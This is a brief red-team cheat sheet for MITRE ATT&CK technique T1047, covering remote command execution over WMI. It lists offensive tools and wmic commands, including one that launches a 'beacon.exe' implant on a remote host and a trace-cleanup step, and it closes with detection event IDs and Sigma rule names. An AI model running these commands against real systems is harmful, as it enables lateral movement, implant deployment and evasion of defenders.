# T1047 – Windows Management Instrumentation (WMI)

## 🎯 Objective
Use WMI for local/remote command execution on Windows systems.

---

## 🧰 Tools
- wmic.exe
- PowerShell: `Invoke-WmiMethod`, `Get-WmiObject`
- Impacket: `wmiexec.py`, `smbexec.py`
- Sliver / CS modules: `execute-wmi`

---

## ✅ Checklist
| Step | Task | Example |
|------|------|----------|
| 1 | Enumerate classes | `wmic process list brief` |
| 2 | Launch remote process | `wmic /node:HOST process call create "cmd.exe /c beacon.exe"` |
| 3 | Cleanup traces | `wmic /node:HOST process delete` |

---

## ⚕ Detection
| Source | Event ID | Indication |
|---------|-----------|-------------|
| Microsoft-Windows-WMI-Activity | 5857–5859 | Remote WMI execution |
| Sysmon | 1, 3 | process creation + network |
| Sigma | `wmi_remote_exec.yml`, `persistence_wmi.yml` |


Author : yasinabedini
GitHub : https://github.com/yasinabedini

